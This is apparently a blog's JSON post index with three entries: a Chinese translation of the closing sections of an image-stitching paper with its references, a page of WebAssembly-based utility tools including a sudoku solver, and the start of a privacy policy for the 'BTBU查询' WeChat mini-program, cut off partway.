焦距估计和3D旋转\n我们通过改进AutoStitch25提出的束调整方法来估计每个图像的焦距和3D旋转角度。我们以两种方式改进他们的方法：更好的初始化和更好的点匹配。更好的初始化改善了方法的收敛性。\n从两幅图像之间的单应性，我们可以估计两幅图像262728的焦距。在执行APAP之后，我们对网格的每个四边形都有一个单应性。因此，每个四边形给出一个对图像焦距的估计。我们将这些估计的中值作为焦距的初始化并形成Ii的初始内在矩阵${\\rm K}_i$。一旦我们得到${\\rm\nK}_i$，我们通过最小化以下投影误差获得Ii和Ij之间的3D旋转${\\rm R}_{ij}$的初始估计：\n$$\n{\\rm R}_{ij} = \\arg \\min_{\\rm R} \\sum_{p^{ij}_k \\in {\\rm M}^{ij}} \\|\n{\\rm K}_j {\\rm R} {\\rm K}^{-1}_i p^{ij}_k - \\Phi(p^{ij}_k) \\|^2 \\tag{7}\n$$\n它可以通过SVD解决。请注意，AutoStitch使用特征点及其匹配来估计两个图像之间的3D旋转。特征点的问题在于它们不均匀地分布在图像空间中并且可能具有不利影响。我们使用匹配点而不是特征点来估计3D旋转。\n随着${\\rm K}_i$和${\\rm\nR}_{ij}$的更好初始化，执行束调整可获得每个图像Ii的焦距fi和3D旋转${\\rm R}_i$。等式4中Ii的标度si可以设置为\n$$\ns_i=f_0/f_i \\tag{8}\n$$\n\n\n\n\n\n\n\n\n\n\n\n\n\n(a) AANAP\n(b) 我们的结果（3D方法）\n\n\n\n图3\nAANAP没有选择正确的旋转(a)。我们的方法做得更好，产生了更自然的结果。\n4.2 旋转角度的选择\n正如第1节所述，尽管旋转角度的选择对于自然性至关重要，但很少有人关注它。AutoStitch假设用户很少相对于地平线扭曲相机，并且可以通过计算上矢量29来拉直波浪状全景图。AANAP使用特征匹配来确定最佳相似性变换30。启发式方法不够鲁棒，如图3所示。\n旋转选择的目的是为每个图像Ii分配旋转角θi。我们提出了几种确定旋转的方法，2D方法和3D方法。在描述这些方法之前，我们首先定义几个术语。\n相对旋转范围。给定一对相邻图像Ii和Ij，其每对匹配点唯一地确定相对旋转角。假设第k对匹配点给出了相对旋转角θkij。我们将Ii和Ij之间的相对旋转范围Θij定义为\nΘij = [θminij, θmaxij]\n此处θminij = minkθkij并且θmaxij = maxkθmaxij。\n最小线段失真旋转（MLDR）。人类对线条更敏感。因此，我们提出了一个步骤，用于找到相对于线对齐的两个相邻图像之间的最佳相对旋转。我们首先使用LSD检测器31检测线。通过APAP给出的对齐，我们可以找到两个相邻图像Ii和Ij之间的线的对应关系。每对对应线唯一地确定一个相对旋转角度。我们使用RANSAC作为一种强大的投票机制来确定Ii和Ij之间的相对旋转角度。每条线的投票权取决于其长度和宽度的乘积。最终的相对旋转角度被视为所有内部旋转角度的平均值。我们将ϕij表示为由MLDR确定的Ii和Ij之间的相对旋转角。\n给定由MLDR估计的所有相对旋转角ϕij，我们可以找到一组旋转角{θi}以尽可能地满足MLDR成对旋转关系。我们将θi表示为单位2D矢量(ui, vi)并表示以下能量函数：\n$$\n{\\rm E}_{MLDR}=\\sum_{(i,j)\\in {\\rm J}}\\Bigg\\|\nR(\\phi^{ij})\\begin{bmatrix} u_i \\\\ v_i\\end{bmatrix} - \\begin{bmatrix}\nu_j \\\\ v_j\\end{bmatrix}\n\\Bigg\\|^2 \\tag{10}\n$$\n其中${\\rm R}(\\phi^{ij})$是由ϕij指定的2D旋转矩阵。通过最小化${\\rm E}_{MLDR}$，我们找到一组旋转角度θi以尽可能地满足MLDR成对旋转角度约束。为了避免这个简单的解决方案，我们需要至少一个约束来求解方程10。我们提出了两种方法来获得额外的约束。\n旋转选择（2D方法）。在这种方法中，我们与Brown等人做出了类似的假设32，假设用户很少相对于地平线扭曲相机。也就是说，如果可能的话，我们更喜欢θi = 0∘。首先，我们需要确定一个图像的旋转角度。在不失一般性的情况下，让参考图像的角度为0∘，即θ0 = 0∘。一旦对于某个图像Ii具有旋转角θi，我们就可以通过Θj = Θij + θi确定与Ii相邻的图像Ij的旋转范围。如果0∘在Θj范围内，则意味着零旋转是合理的，我们应该设置θj = 0。通过沿邻接图使用BFS传播旋转范围，我们可以找到一组旋转0∘的图像。详细过程的伪代码在补充材料中给出。设Ω是旋转角度等于0∘的图像集合。我们通过最小化下列式子找到θi $$\n\\begin{align}\n&amp;{\\rm E}_{MLDR}+\\lambda_z{\\rm E}_{ZERO}  \\tag{11} \\\\\n&amp;{\\rm E}_{ZERO}=\\sum_{i\\in\\Omega}\\Bigg\\|\n\\begin{bmatrix} u_i \\\\ v_i \\end{bmatrix} -\n\\begin{bmatrix} 1 \\\\ 0 \\end{bmatrix}\n\\Bigg\\|^2 \\tag{12}\n\\end{align}\n$$\n并且λz = 1000，使得Ω中的图像可能被指定为零旋转，即保持它们的原始方向。\n旋转选择（3D方法）。在此方法中，我们使用在本节开头估计的3D旋转矩阵${\\rm R}_i$。我们首先分解3D旋转矩阵${\\rm R}_i$以获得相对于z轴的旋转角αi。两个相邻图像Ii和Ij之间的相对旋转可以确定为αij = αj − αi。如果αij ∈ Θij，则意味着估计是合理的并且可以使用。否则，我们应该使用MLDR的相对旋转ϕij。设Ω是使用ϕij的配对集，$\\bar{\\Omega}={\\rm\nJ}-\\Omega$为其他部分。通过最小化确定旋转角度 $$\n\\sum_{(i,j)\\in \\Omega}\\Bigg\\|R(\\phi^{ij}) \\begin{bmatrix} u_i \\\\ v_i\n\\end{bmatrix} -\\begin{bmatrix} u_j \\\\ v_j \\end{bmatrix} \\Bigg \\|^2 +\n\\lambda_{\\gamma} \\sum_{(i,j)\\in \\bar{\\Omega}} \\Bigg\\| R(\\alpha^{ij})\n\\begin{bmatrix} u_i \\\\ v_i\\end{bmatrix} - \\begin{bmatrix} u_j \\\\ v_j\n\\end{bmatrix} \\Bigg\\|^2 \\tag{13}\n$$\n我们设置λγ = 10以给予3D旋转更多权重。\n\n\n\n\n\n\n\n\n(a)\n\n\n\n\n\n\n(b)\n\n\n\n\n(c)\n\n\n\n\n(d)\n\n\n\n\n(e)\n\n\n\n\n(f)\n\n\n\n\n(g)\n\n\n\n\n\n图4所示。两图拼接的一个例子。(a) AutoStitch，(b)\nAutoStitch+ours，(c)APAP，(d) ASAP，(e) SPHP+APAP，(f) AANAP，(g) Ours\n(3D method)。\n5 实验和结果\n我们将方法（2D和3D版本）与四种方法进行比较，AutoStitch33，APAP34，SPHP35和AANAP36。实验在具有2.8GHz CPU和16GB\nRAM的MacBook Pro上进行。使用VLFeat37提取SIFT特征。对于基于网格的方法，网格大小设为40 × 40。我们在42组图像上测试了6种方法（3种来自38，6种来自39，4种来自40，7种来自41，3种来自42和19种我们自己收集）。所有比较都可以在补充材料中找到。图像数量从2到35不等。我们收集的测试集比现有测试集更具挑战性。我们将发布所有代码和数据以便于进一步比较。不考虑特征检测和匹配，对于800 × 600的分辨率，我们的方法需要0.1秒来拼接两个图像（图4）和8s用于35个图像（图6）。\n图4比较了拼接两幅图像的所有方法。图4(a)显示了AutoStitch的结果。请注意，存在明显的错位。我们的方法可用于赋予其他具有APAP对齐能力的方法。图4(b)显示了很大程度上消除了未对准的结果。虽然具有良好的对准质量，但APAP存在透视畸变问题（图4(c)）。可以将APAP的视角模型改为相似模型，如ASAP，类似于Schaefer等人的方法43。图4(d)显示了ASAP的结果。尽管相似模型在减少失真方面表现良好，但不能很好地对准（特写处）。此外，拼接结果将表现出具有倾斜和不均匀变形的伪影。SPHP存在不自然旋转的问题（图4(e)）。AANAP在这个例子中给出了一个合理的结果（图4(f)），但地板上的线条略微扭曲，如特写中更清楚地显示。在这个例子中，我们的方法具有最佳的缝合质量（图4(g)）。\n图1给出了通过缝合18个图像获得全景图的示例。由于视野有限，SPHP在这个例子上失败了。APAP\n+ BA通过将图像投影到圆柱体上来克服这个问题44。然而，由于不正确的比例和旋转估计，结果表现出对图像的非均匀失真（图1(a)）。AANAP不会正确选择旋转和缩放。如图1(b)所示，误差会累积并显著地弯曲拼接结果。请注意，该问题不能通过全景图矩形化的方法45来解决，因为它会在不参考原始图像的情况下尽可能地保持输入全景的原始方向。全景图可以变成矩形但场景仍然是弯曲的。我们的结果（图1(c)）看起来更自然，因为它可以正确选择比例和旋转角度。我们的方法很灵活，可以扩展以符合一些其他约束。在这个例子中，我们使用消失点检测方法46来检测一个图像的水平线。通过这个附加约束，拼接图像更好地与地平线对齐，以获得更自然的结果（图1(d)）。\n\n图5所示。六张图片拼接样例。(左上)AutoStitch，(左下)SPHP+APAP，(右上)AANAP，(右下)我们的结果（2D方法）。\n在图5中拼接六个图像的示例中，AutoStitch由于其球形投影（左上角）而引入明显的失真。SPHP无法处理图像之间的2D拓扑并导致失真（左下）。AANAP的结果表现出不自然的旋转和形状扭曲（右上）。我们的结果在所有结果中看起来最自然（右下）。图6的输入包含35个图像。AutoStitch受到球形投影（左上角）引起的失真的影响。AANAP在整个图像上都有扭曲（右上角）。我们的两种方法都能提供更自然的结果。2D方法更好地保持每个图像的透视（左下），而3D方法保持原始场景的更好的3D透视（右下）。\n总之，虽然ASAP，AANAP，SPHP和我们的方法都使用相似性，但我们的方法给出了更好的结果。差异来自于如何利用相似性。SPHP尝试减少视角失真，但是当视野宽广（图1）并且图像之间的空间关系是2D（图5）时，它会失败。AANAP试图解决不自然的旋转，但它不够稳健而且经常失败（图1(b)，图3和图5）。此外，AANAP不会优化形状失真，它一次只能拼接两个图像。拼接多个图像时可能存在局部失真（图4(f)，图5和图6）。我们的方法比以前的方法更好地解决了所有这些问题。\n\n图6所示。这是一个拼接35张图片的例子。(左上)AutoStitch，(右上)AANAP，(左下)2D方法，(右下)3D方法。\n6 结论\n本文提出一种图像拼接方法，用于合成自然结果。我们的方法采用局部变形模型。通过添加全局先验相似性，我们的方法可以在保持良好对齐的同时减少失真。更重要的是，借助我们的缩放尺度和旋转角度选择方法，全局先验相似性会产生更自然的拼接图像。\n本文提出了两个主要的贡献。第一，它提出了一种结合APAP的对齐精度和更小相似度失真的方法。尽管可以探究各个部分，但我们以不同的方式利用它们。该方法也可以处理多个图像的自然对齐。第二，它提出了用于稳健估计图像间的恰当地相似性变换的方法。它们有两个目的：进一步在局部加强相似性并建立良好的全局结构。实验证实了该方法的有效性和鲁棒性。\n参考文献\n\n\n\nSzeliski R. Image alignment and stitching: a tutorial,\nfoundations and trends in computer graphics and computer vision[J]. Now\nPublishers, 2006, 2(1): 120.↩︎\nLin W Y, Liu S, Matsushita Y, et al. Smoothly varying\naffine stitching[C]//CVPR 2011. IEEE, 2011: 345-352.↩︎\nZaragoza J, Chin T J, Brown M S, et\nal. As-projective-as-possible image stitching with moving\nDLT[C]//Proceedings of the IEEE conference on computer vision and\npattern recognition. 2013: 2339-2346.↩︎\nChang C H, Sato Y, Chuang Y Y. Shape-preserving\nhalf-projective warps for image stitching[C]//Proceedings of the IEEE\nConference on Computer Vision and Pattern Recognition. 2014:\n3254-3261.↩︎\nLin C C, Pankanti S U, Natesan Ramamurthy K, et\nal. Adaptive as-natural-as-possible image stitching[C]//Proceedings of\nthe IEEE Conference on Computer Vision and Pattern Recognition. 2015:\n1155-1163.↩︎\nChang C H, Sato Y, Chuang Y Y. Shape-preserving\nhalf-projective warps for image stitching[C]//Proceedings of the IEEE\nConference on Computer Vision and Pattern Recognition. 2014:\n3254-3261.↩︎\nLin C C, Pankanti S U, Natesan Ramamurthy K, et\nal. Adaptive as-natural-as-possible image stitching[C]//Proceedings of\nthe IEEE Conference on Computer Vision and Pattern Recognition. 2015:\n1155-1163.↩︎\nBrown M, Lowe D G. Automatic panoramic image stitching\nusing invariant features[J]. International journal of computer vision,\n2007, 74(1): 59-73.↩︎\nLin C C, Pankanti S U, Natesan Ramamurthy K, et\nal. Adaptive as-natural-as-possible image stitching[C]//Proceedings of\nthe IEEE Conference on Computer Vision and Pattern Recognition. 2015:\n1155-1163.↩︎\nZaragoza J, Tat-Jun C, Tran Q H, et\nal. As-Projective-As-Possible Image Stitching with Moving DLT[J]. IEEE\ntransactions on pattern analysis and machine intelligence, 2014, 36(7):\n1285.↩︎\nSzeliski R. Image alignment and stitching: a tutorial,\nfoundations and trends in computer graphics and computer vision[J]. Now\nPublishers, 2006, 2(1): 120.↩︎\nBrown M, Lowe D G. Recognising panoramas[C]//ICCV.\n2003, 3: 1218.↩︎\nGao J, Kim S J, Brown M S. Constructing image panoramas\nusing dual-homography warping[C]//CVPR 2011. IEEE, 2011: 49-56.↩︎\nLin W Y, Liu S, Matsushita Y, et al. Smoothly varying\naffine stitching[C]//CVPR 2011. IEEE, 2011: 345-352.↩︎\nZaragoza J, Chin T J, Brown M S, et\nal. As-projective-as-possible image stitching with moving\nDLT[C]//Proceedings of the IEEE conference on computer vision and\npattern recognition. 2013: 2339-2346.↩︎\nChang C H, Sato Y, Chuang Y Y. Shape-preserving\nhalf-projective warps for image stitching[C]//Proceedings of the IEEE\nConference on Computer Vision and Pattern Recognition. 2014:\n3254-3261.↩︎\nLin C C, Pankanti S U, Natesan Ramamurthy K, et\nal. Adaptive as-natural-as-possible image stitching[C]//Proceedings of\nthe IEEE Conference on Computer Vision and Pattern Recognition. 2015:\n1155-1163.↩︎\nZelnik-Manor L, Peters G, Perona P. Squaring the circle\nin panoramas[C]//Tenth IEEE International Conference on Computer Vision\n(ICCV’05) Volume 1. IEEE, 2005, 2: 1292-1299.↩︎\nKopf J, Lischinski D, Deussen O, et al. Locally adapted\nprojections to reduce panorama distortions[C]//Computer Graphics Forum.\nOxford, UK: Blackwell Publishing Ltd, 2009, 28(4): 1083-1089.↩︎\nCarroll R, Agrawal M, Agarwala A. Optimizing\ncontent-preserving projections for wide-angle images[C]//ACM\nTransactions on Graphics (TOG). ACM, 2009, 28(3): 43.↩︎\nBrown M, Lowe D G. Automatic panoramic image stitching\nusing invariant features[J]. International journal of computer vision,\n2007, 74(1): 59-73.↩︎\nZaragoza J, Chin T J, Brown M S, et\nal. As-projective-as-possible image stitching with moving\nDLT[C]//Proceedings of the IEEE conference on computer vision and\npattern recognition. 2013: 2339-2346.↩︎\nLowe D G. Distinctive image features from\nscale-invariant keypoints[J]. International journal of computer vision,\n2004, 60(2): 91-110.↩︎\nIgarashi T, Igarashi Y. Implementing\nas-rigid-as-possible shape manipulation and surface flattening[J].\njournal of graphics, gpu, and game tools, 2009, 14(1): 17-30.↩︎\nBrown M, Lowe D G. Automatic panoramic image stitching\nusing invariant features[J]. International journal of computer vision,\n2007, 74(1): 59-73.↩︎\nSzeliski R. Image alignment and stitching: a tutorial,\nfoundations and trends in computer graphics and computer vision[J]. Now\nPublishers, 2006, 2(1): 120.↩︎\nShum H Y, Szeliski R. Panoramic image mosaics[R].\nTechnical Report MSR-TR-97-23, Microsoft Research, 1997.↩︎\nSzeliski R, Shum H Y. Creating full view panoramic\nimage mosaics and environment maps[C]//Proceedings of the 24th annual\nconference on Computer graphics and interactive techniques. 1997:\n251-258.↩︎\nBrown M, Lowe D G. Automatic panoramic image stitching\nusing invariant features[J]. International journal of computer vision,\n2007, 74(1): 59-73.↩︎\nLin C C, Pankanti S U, Natesan Ramamurthy K, et\nal. Adaptive as-natural-as-possible image stitching[C]//Proceedings of\nthe IEEE Conference on Computer Vision and Pattern Recognition. 2015:\n1155-1163.↩︎\nVon Gioi R G, Jakubowicz J, Morel J M, et al. LSD: a\nline segment detector[J]. Image Processing On Line, 2012, 2: 35-55.↩︎\nBrown M, Lowe D G. Automatic panoramic image stitching\nusing invariant features[J]. International journal of computer vision,\n2007, 74(1): 59-73.↩︎\nBrown M, Lowe D G. Automatic panoramic image stitching\nusing invariant features[J]. International journal of computer vision,\n2007, 74(1): 59-73.↩︎\nZaragoza J, Chin T J, Brown M S, et\nal. As-projective-as-possible image stitching with moving\nDLT[C]//Proceedings of the IEEE conference on computer vision and\npattern recognition. 2013: 2339-2346.↩︎\nChang C H, Sato Y, Chuang Y Y. Shape-preserving\nhalf-projective warps for image stitching[C]//Proceedings of the IEEE\nConference on Computer Vision and Pattern Recognition. 2014:\n3254-3261.↩︎\nLin C C, Pankanti S U, Natesan Ramamurthy K, et\nal. Adaptive as-natural-as-possible image stitching[C]//Proceedings of\nthe IEEE Conference on Computer Vision and Pattern Recognition. 2015:\n1155-1163.↩︎\nVedaldi A, Fulkerson B. VLFeat: An open and portable\nlibrary of computer vision algorithms[C]//Proceedings of the 18th ACM\ninternational conference on Multimedia. 2010: 1469-1472.↩︎\nLin C C, Pankanti S U, Natesan Ramamurthy K, et\nal. Adaptive as-natural-as-possible image stitching[C]//Proceedings of\nthe IEEE Conference on Computer Vision and Pattern Recognition. 2015:\n1155-1163.↩︎\nChang C H, Sato Y, Chuang Y Y. Shape-preserving\nhalf-projective warps for image stitching[C]//Proceedings of the IEEE\nConference on Computer Vision and Pattern Recognition. 2014:\n3254-3261.↩︎\nZaragoza J, Chin T J, Brown M S, et\nal. As-projective-as-possible image stitching with moving\nDLT[C]//Proceedings of the IEEE conference on computer vision and\npattern recognition. 2013: 2339-2346.↩︎\nNomura Y, Zhang L, Nayar S K. Scene collages and\nflexible camera arrays[C]//Proceedings of the 18th Eurographics\nconference on Rendering Techniques. 2007: 127-138.↩︎\nGao J, Kim S J, Brown M S. Constructing image panoramas\nusing dual-homography warping[C]//CVPR 2011. IEEE, 2011: 49-56.↩︎\nSchaefer S, McPhail T, Warren J. Image deformation\nusing moving least squares[M]//ACM SIGGRAPH 2006 Papers. 2006:\n533-540.↩︎\nZaragoza J, Tat-Jun C, Tran Q H, et\nal. As-Projective-As-Possible Image Stitching with Moving DLT[J]. IEEE\ntransactions on pattern analysis and machine intelligence, 2014, 36(7):\n1285.↩︎\nHe K, Chang H, Sun J. Rectangling panoramic images via\nwarping[J]. ACM Transactions on Graphics (TOG), 2013, 32(4): 1-10.↩︎\nLezama J, Grompone von Gioi R, Randall G, et\nal. Finding vanishing points via point alignments in image primal and\ndual domains[C]//Proceedings of the IEEE Conference on Computer Vision\nand Pattern Recognition. 2014: 509-515.↩︎\n\n\n"},{"title":"小工具集合","url":"/2024/10/19/%E5%B0%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/","content":"小工具集合\n基于项目 smilelc3/MyLittleTool\n和 smilelc3/sudoku-solver，并使用\nwasm\n技术实现 JavaScript 调用 C/C++ 和\nGo。\n\n\n\n    16进制转字符串\n    \n    提交\n    \n        输出:\n        \n    \n\n\n\n    字符串转16进制\n    \n    提交\n    \n        输出:\n        \n    \n\n\n\n    Linear11 格式转换实数\n    \n    \n    提交\n    \n        输出:\n        \n    \n\n\n\n    Linear16 格式转换实数\n    \n    \n        \n        \n    \n    提交\n    \n        输出:\n        \n    \n\n\n\n    时间加减计算器\n    \n        \n        +\n        -\n        \n    \n    提交\n    \n        输出:\n        \n    \n\n\n\n    校验和计算 (ByteAcc算法)\n    \n    提交\n    \n        输出:\n        \n    \n\n\n\n    URL 编码 / 解码\n    \n    编码\n    解码\n    \n        输出:\n        \n    \n\n\n\n    数独求解(舞蹈链算法)\n    \n        \n        \n        \n    \n    求解\n    清空\n    输出:\n\n\n\n\n    let C_Hex2Ascii, C_Ascii2Hex, C_Linear11Trans, C_Linear16Trans, C_ByteAccByMem, C_DateTimeCalc;\n    // 等待 wasm 模块加载\n    Module.onRuntimeInitialized = async () => {\n        C_Hex2Ascii = Module.cwrap('C_Hex2Ascii', 'string', ['string']);\n        C_Ascii2Hex = Module.cwrap('C_Ascii2Hex', 'string', ['string']);\n        C_Linear11Trans = Module.cwrap('C_Linear11Trans', 'string', ['string']);\n        C_Linear16Trans = Module.cwrap('C_Linear16Trans', 'string', ['string', 'string']);\n        C_ByteAccByMem = Module.cwrap('C_ByteAccByMem', 'string', ['number', 'number']);\n        C_DateTimeCalc = Module.cwrap('C_DateTimeCalc', 'string', ['string', 'string', 'string']);\n        console.log(\"C/C++ Wasm loaded successfully\");\n    };\n    // 调用 wasm 中导出的函数或自定义函数\n    function summit(funcName, inputId, outputId) {\n        let input;\n        if (document.getElementById(inputId)) {\n            input = document.getElementById(inputId).value;\n        }\n        let output;\n        switch (funcName) {\n            case 'Hex2Ascii':\n                output = C_Hex2Ascii(input);\n                break;\n            case 'Ascii2Hex':\n                output = C_Ascii2Hex(input);\n                break;\n            case 'Linea11Trans':\n                output = C_Linear11Trans(input);\n                break;\n            case 'Linea16Trans':\n                input2 = document.getElementById(\"inLinear16Man\").value;\n                output = C_Linear16Trans(input, input2);\n                break;\n            case 'DateTimeCalc':\n                input2 = document.getElementById('opAdd').classList.contains('active') ? \"+\" : \"-\";\n                input3 = document.getElementById(\"durationTime\").value;\n                output = C_DateTimeCalc(input, input2, input3);\n                break;\n            case 'ByteAcc':\n                return doByteAcc(outputId);\n            case 'UrlEncode':\n                output = encodeURI(input);\n                break;\n            case 'UrlDecode':\n                output = decodeURI(input);\n                break;\n        }\n        updateOutput(outputId, output);\n    }\n    function updateOutput(outputId, output) {\n        document.getElementById(outputId).innerText = `${output}`;\n    }\n    function doByteAcc(outputId) {\n        const fileInput = document.getElementById('fileInput');\n        if (fileInput.files.length === 0) {\n            alert('请先选择一个文件');\n            return;\n        }\n        const file = fileInput.files[0];\n        if (file.size > 2147483648 / 2 * 0.9) {\n            console.log(\"file size \" + file.size + \" is out of range\")\n            updateOutput(outputId, \"文件过大\");\n            return;\n        }\n        reader = new FileReader();\n        reader.onload = (event) => {\n            updateOutput(outputId, \"处理中\");\n            let arrayBuffer = event.target.result;\n            let byteArray = new Uint8Array(arrayBuffer);\n            const length = byteArray.length;\n            // 分配内存并拷贝数据\n            let buffer = Module._malloc(length);\n            try {\n                Module.HEAPU8.set(byteArray, buffer);\n                byteArray = null;\n                arrayBuffer = null;\n                // 调用 C++ 函数打印字节\n                const checksumByteAcc = C_ByteAccByMem(buffer, length);\n                updateOutput(outputId, checksumByteAcc);\n            } catch (error) {\n                console.error(\"Error during C function call:\", error);\n                updateOutput(outputId, \"处理出错\");\n            } finally { // 释放内存\n                Module._free(buffer);\n                buffer = null;\n                byteArray = null;\n                arrayBuffer = null;\n                reader.onload = null; // 清理事件处理程序\n                reader = null;\n            }\n        };\n        reader.onprogress = (event) => {\n            updateOutput(outputId, \"处理中\");\n        }\n        reader.readAsArrayBuffer(file);\n    }\n\n\n\n    let go;\n    async function loadGoWasm() {\n        go = new Go();\n        const response = await fetch(\"/js/sudoku.wasm\");\n        const result = await WebAssembly.instantiateStreaming(response, go.importObject);\n        go.run(result.instance);\n    }\n    loadGoWasm().then(() => {\n        console.log(\"Go Wasm loaded successfully\");\n    }).catch(err => {\n        console.error(\"Error loading Go Wasm:\", err);\n    });\n    function solveSudoku() {\n        const inputs = document.querySelectorAll('.sudoku-input'); // 获取所有输入框\n        const matrix = [];\n        inputs.forEach(input => {   // 将输入值转换为数字，如果为空则为 0\n            matrix.push(input.value ? Number(input.value) : 0);\n        });\n        if (matrix.length != 81) {    // 确保数组长度为 81\n            alert(\"输入不完整，请确保填写所有数字。\");\n            return;\n        }\n        const jsArray = Array.from(matrix);\n        const ret = GO_sudoku(jsArray);\n        if (ret.isSolved) {             // 填充表格\n            inputs.forEach((input, index) => {\n                input.value = ret.result[index]; // 填充结果数组\n                document.getElementById('outSudoku').textContent = '输出: 耗时 ' + ret.timeMs + ' ms';\n            });\n        } else {\n          document.getElementById('outSudoku').textContent = '该数独无解';\n        }\n    };\n    function clearSudoku() {\n        const inputs = document.querySelectorAll('.sudoku-input');\n        inputs.forEach(input => {\n            input.value = ''; // 清空输入框\n            document.getElementById('outSudoku').textContent = '输出:';\n        });\n    };\n\n\n    const tableBody = document.getElementById('sudoku-tbody');\n    for (let i = 0; i < 9; i++) {\n        const row = document.createElement('tr'); // 创建一行\n        for (let j = 0; j < 9; j++) {\n            const cell = document.createElement('td'); // 创建一个单元格\n            const input = document.createElement('input'); // 创建输入框\n            input.type = 'number'; // 设置输入框类型\n            input.className = 'sudoku-input';\n            input.min = 1; // 设置最小值\n            input.max = 9; // 设置最大值\n            input.addEventListener('input', function () {\n                    // 将输入值限制为 1 到 9 的数字\n                    if (this.value.length > 1) {\n                        this.value = this.value.slice(0, 1); // 只保留第一个字符\n                    }\n                    const num = parseInt(this.value, 10);   // 必须满足1~9\n                    if (num < 1 || num > 9 || isNaN(num)) {\n                        this.value = ''; // 清空输入\n                    }\n                });\n            cell.appendChild(input); // 将输入框添加到单元格\n            row.appendChild(cell); // 将单元格添加到行\n        }\n        tableBody.appendChild(row); // 将行添加到表格主体\n    }\n    function validateInput(input) {\n        const value = parseInt(input.value, 10);\n        if (value < 1 || value > 9 || isNaN(value)) {\n            input.value = ''; // 清空输入\n        }\n    }\n\n\n    function OptoggleButtons(activeButton) {\n        const opAddButton = document.getElementById('opAdd');\n        const opSubButton = document.getElementById('opSub');\n\n        if (activeButton === 'opAdd') {\n            opAddButton.classList.add('active');\n            opAddButton.classList.remove('inactive');\n            opSubButton.classList.add('inactive');\n            opSubButton.classList.remove('active');\n        } else {\n            opSubButton.classList.add('active');\n            opSubButton.classList.remove('inactive');\n            opAddButton.classList.add('inactive');\n            opAddButton.classList.remove('active');\n        }\n    }\n\n\n    .input-container {\n        display: flex; /*flex; 属性将输入框放在同一行 */\n        align-items: center;\n        justify-content: center;\n        gap: 10px; /* 输入框之间的间距 */\n    }\n    textarea, input[type=\"text\"], input[type=\"file\"] {\n        width: 100%;\n        padding: 10px;\n        margin: 10px 0;\n        border: 2px solid #4CAF50;\n        border-radius: 5px;\n        font-family: Consolas;\n        font-size: 15px;\n        resize: vertical;\n    }\n    button {\n        padding: 10px 20px;\n        background-color: #4CAF50;\n        color: white;\n        border: none;\n        border-radius: 5px;\n        cursor: pointer;\n        font-size: 15px;\n    }\n    .add-button, .sub-button {\n        padding: 0px 0px;\n        width: 80px;\n        height: 40px;\n        font-size: 20px;\n        transition: background-color 0.3s;\n    }\n    .add-button.active {\n        background-color: #007BFF; /* 高亮颜色 */\n        color: white;\n    }\n    .add-button.inactive {\n        background-color: #f0f0f0; /* 低亮颜色 */\n        color: black;\n    }\n    .sub-button.active {\n        background-color: #FF5733; /* 高亮颜色 */\n        color: white;\n    }\n    .sub-button.inactive {\n        background-color: #f0f0f0; /* 低亮颜色 */\n        color: black;\n    }\n    button:hover {\n        background-color: #45a049;\n    }\n    .output-container {\n        display: flex; /* 使用 Flexbox 布局 */\n        align-items: flex-end;\n        margin-top: 10px;\n    }\n    .output-label {\n        margin-right: 10px;\n    }\n    .output {\n        margin-top: 10px;\n        font-family: Consolas;\n        font-size: 15px;\n        border: 1px solid #aaa;\n        min-height: 30px;\n        border-radius: 5px;\n        flex: 1; /* 使输出框占满剩余的空间 */\n    }\n    .sudoku-table {\n        width: auto;\n        td {\n            width: 30px;\n            height: 30px;\n            border: 1px solid #45a049;\n            text-align: center;\n            vertical-align: middle;\n            position: relative; /* 为了绝对定位标签 */\n            padding: 10px;\n            background-color: #f9f9f9;\n        }\n        .sudoku-input {\n        border: none;\n        text-align: center;\n        font-size: 22px;\n        box-sizing: border-box;\n        padding: 0;\n        margin: 0;\n        outline: none;\n        color: #333; /* 输入框中数字的颜色 */\n        background-color: #f9f9f9;\n        }\n        /* 隐藏数字输入框的上下箭头 */\n        input[type=\"number\"]::-webkit-inner-spin-button,\n        input[type=\"number\"]::-webkit-outer-spin-button {\n            -webkit-appearance: none;\n            margin: 0;\n        }\n        td:first-child {\n            border-left: 2px solid #4CAF50; /* 左边框加粗 */\n        }\n        td:nth-child(3n) {\n            border-right: 2px solid #4CAF50; /* 右边框加粗 */\n        }\n        tr:first-child td {\n            border-top: 2px solid #4CAF50; /* 上边框加粗 */\n        }\n        tr:nth-child(3n) td {\n            border-bottom: 2px solid #4CAF50; /* 下边框加粗 */\n        }\n    }\n\n\n"},{"title":"微信小程序“BTBU查询”的隐私政策","url":"/2018/08/03/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9CBTBU%E6%9F%A5%E8%AF%A2%E2%80%9D%E7%9A%84%E9%9A%90%E7%A7%81%E6%94%BF%E7%AD%96/","content":"\n我们的隐私政策，说明了您通过我们的小程序应用访问和使用“BTBU查询”（下称小程序）过程中信息是如何收集，使用的。就目前而言，我们只使用了最简单的第三方授权登录方式，没有利用任何方式去主动获取您的隐私，我们在后续的过程中如非必要不会在windows程序、App上去请求那些不必要的权限去窥探您的隐私。\n\n1、我们会收集什么信息？\n当您使用小程序的过程中，我们会在您自愿选择服务或提供信息的情况下收集您的私人信息，以便向您提供更好的用户服务。\n“私人信息”包括您提供给我们的北京工商大学教务处账号、密码等。小程序不会主动收集或请求用户提供这些信息。\n2、我们如何使用收集的信息？\n我们可能通过以下方式使用信息：\n\n当您许可并通过交易请求获得小程序的相关产品及服务时；\n当提供客户服务，需要回应您的电子邮件，文件，问题，意见，要求和投诉时；\n当使用产品过程中，为了让您使用产品更加个性化和带来更好的体验，需要分析使用情况和趋势时；\n当需要改进对您的服务体验、管理和操作时，发送给您的许可证明，产品更新，安全警报，支持和管理信息等。\n\n3、信息的披露\n我们将对信息严格保密，不会与他人分享这些信息，亦不会将其出售、出租或以其他方式分发给他人。\n4、信息的提供\n小程序的用户总是可以选择是否披露信息。有些信息是登记我们的服务所必需的，但大多数其他信息的提供是由用户决定的。小程序将视用户舒适度及自主选择为首位。小程序可能为用户提供网络互动活动，为便于用户参予互动活动并获取互动奖品，小程序通常要求申请者在联系方法(通讯地址和电话)之外，还要根据其个人兴趣填写表格。此类信息被小程序用来累积用户数据。如果用户不想提供所要求的信息和参加此类活动，这完全由用户自行决定。\n5、未成年人信息及使用\n小程序建议：任何未成年人参加网上活动应事先取得家长或其法定监护人（以下简称”监护人”）的书面同意。小程序将根据国家相关法律法规的规定保护未成年人的相关信息。\n6、Cookies\n通过使用Cookies，小程序向用户提供简单易行并富个性化的网络体验。一个Cookies\n是少